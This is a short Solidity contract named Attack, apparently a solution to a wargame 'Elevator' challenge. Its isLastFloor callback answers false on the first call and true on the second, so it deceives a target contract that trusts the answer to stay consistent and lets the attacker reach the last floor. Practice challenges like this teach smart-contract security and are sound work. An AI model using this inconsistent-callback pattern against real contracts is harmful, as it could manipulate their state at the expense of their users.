// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

contract Attack {
    IElevator public immutable elevator;
    uint256 public floor;
    uint256 public count;

    constructor(address _elevator, uint256 _floor) {

        elevator = IElevator(_elevator);
        floor = _floor;
        count = 0;

    }

    function attack() external {

        elevator.goTo(floor);
        
    }

    function isLastFloor(uint256 _newFloor) external returns (bool) {

        if(count == 0) {
            count += 1;
            return false;
        }
        
        return true;

    }

}